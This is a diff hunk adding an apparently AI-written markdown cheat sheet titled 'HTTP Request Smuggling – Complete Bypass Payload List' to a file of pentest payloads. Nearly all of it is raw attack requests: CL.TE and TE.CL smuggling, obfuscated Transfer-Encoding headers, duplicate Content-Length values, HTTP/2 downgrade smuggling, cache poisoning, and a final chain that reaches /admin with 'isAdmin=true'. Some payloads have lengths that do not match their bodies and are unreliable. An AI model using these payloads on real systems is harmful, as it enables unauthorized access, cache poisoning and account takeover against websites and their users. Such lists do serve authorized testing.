@@ -1865,4 +1865,352 @@ Content-Length: 3
 
 a
 ```
+Below is the **HTTP Request Smuggling – Complete Bypass Payload List**, written in the **exact same style and structure** as your previous ones (Host Header / CORS / XXE / SSRF).
+
+This includes **CL.TE, TE.CL, H2.CL, H2.TE, front-end/back-end bypass vectors, whitespace tricks, obfuscated headers, TE smuggling, chunk poisoning, dual-content-length**, and **real exploitation payloads used in pentests/bug bounties**.
+
+---
+
+# ⭐ **HTTP Request Smuggling – Complete Bypass Payload List**
+
+---
+
+# **1. Core Request Smuggling Types**
+
+### **CL.TE (Content-Length + Transfer-Encoding)**
+
+Frontend → uses *Content-Length*
+Backend → uses *Transfer-Encoding*
+
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+```
+
+---
+
+### **TE.CL (Transfer-Encoding + Content-Length)**
+
+Frontend → uses *Transfer-Encoding*
+Backend → uses *Content-Length*
+
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 15
+
+5
+HELLO
+0
+
+GET /admin HTTP/1.1
+```
+
+---
+
+# **2. TE Header Obfuscation (Bypass)**
+
+Servers parse TE header differently.
+
+```
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked\r
+Transfer-Encoding: chunked; q=1.0
+```
+
+Obfuscated smuggling:
+
+```
+Transfer-Encoding: chunke\u0064
+Transfer-Encoding: CHUNKED
+```
+
+---
+
+# **3. Space / Whitespace / Tab Injection (CRLF Variants)**
+
+```
+Transfer-Encoding:%20chunked
+Transfer-Encoding:%09chunked
+Transfer-Encoding:%00chunked
+```
+
+---
+
+# **4. Dual Content-Length (Multiple Header Collapse)**
+
+Some servers pick **first** CL, others pick **last** CL.
+
+```
+Content-Length: 5
+Content-Length: 100
+
+POST / HTTP/1.1
+```
+
+---
+
+# **5. Chunk Size Manipulation**
+
+Smuggle extra request:
+
+```
+POST / HTTP/1.1
+Host: test
+Transfer-Encoding: chunked
+
+3
+abc
+0
+
+GET /admin HTTP/1.1
+```
+
+---
+
+# **6. Invalid Chunk Extension Bypass**
+
+```
+5;ext=evil
+hello
+0
+```
+
+---
+
+# **7. Partial Chunk + Prefix Smuggling**
+
+Break parser mismatch:
+
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+
+4
+ABCD
+0
+GET /admin HTTP/1.1
+```
+
+---
+
+# **8. Trailing Garbage Bypass**
+
+Some backends ignore garbage after chunks.
+
+```
+0
+X
+GET /admin HTTP/1.1
+Host: victim
+```
+
+---
+
+# **9. Header Folding Tricks (Legacy Smuggling)**
+
+```
+Transfer-Encoding: 
+ chunked
+```
+
+```
+Transfer-Encoding:
+ chunked
+```
+
+```
+Transfer-Encoding:\tchunked
+```
+
+---
+
+# **10. Duplicate TE Headers**
+
+```
+Transfer-Encoding: gzip
+Transfer-Encoding: chunked
+```
+
+Backend may process second.
+
+---
+
+# **11. TE + CL + Obfuscated Content-Length**
+
+```
+Content-Length: 0
+Content-Length: 999
+Transfer-Encoding: chunked
+```
+
+---
+
+# **12. HTTP/2 → HTTP/1 Downgrade Smuggling (H2.CL / H2.TE)**
+
+### **H2.CL**
+
+Client → HTTP/2
+Backend → HTTP/1.1 with **Content-Length**
+
+Smuggle via pseudo headers:
+
+```
+:method: POST
+:path: /
+:authority: victim.com
+content-length: 0
+
+GET /admin HTTP/1.1
+```
+
+---
+
+### **H2.TE**
+
+```
+:method: POST
+:path: /
+:authority: victim.com
+transfer-encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+```
+
+---
+
+# **13. Reverse Proxy Bypass Payloads**
+
+### **Apache + Nginx mismatch**
+
+```
+GET / HTTP/1.1
+Host: test
+Content-Length: 10
+
+GET /admin
+```
+
+### **HAProxy + Node.js mismatch**
+
+```
+Transfer-Encoding: chunked
+0
+
+POST /admin HTTP/1.1
+```
+
+---
+
+# **14. Reverse Proxy Prefix Injection**
+
+```
+GET / HTTP/1.1
+Host: victim
+
+GET /admin HTTP/1.1
+X-Foo: value
+```
+
+---
+
+# **15. Web Cache Poisoning via Smuggling**
+
+Inject poison:
+
+```
+0
+
+GET /cacheable.js HTTP/1.1
+Host: victim.com
+X-Cache-Poison: yes
+```
+
+---
+
+# **16. Smuggling via Obscure Content-Length Encodings**
+
+### Hex CL
+
+```
+Content-Length: 0x10
+```
+
+### Octal
+
+```
+Content-Length: 020
+```
+
+### Mixed
+
+```
+Content-Length: 00x10
+```
+
+---
+
+# **17. Unicode Separator Injection**
+
+```
+Transfer-Encoding: chunked 
+Transfer-Encoding: chunked　
+Transfer-Encoding: chunked 
+```
+
+Where space is a non-ASCII whitespace.
+
+---
+
+# **18. Smuggling via Commented Headers**
+
+```
+Transfer-Encoding: chunked (test)
+Transfer-Encoding: chunked#test
+Transfer-Encoding: chunked//test
+```
+
+---
+
+# **19. Null Byte Header Termination**
+
+```
+Transfer-Encoding: chunked%00
+Content-Length: 10%00
+```
+
+---
+
+# **20. Multi-Request Chain (Full Poison)**
+
+Final staged smuggle:
+
+```
+POST / HTTP/1.1
+Host: victim
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+Host: victim
+Content-Length: 20
+
+isAdmin=true&uid=1
+```
+
+---
 
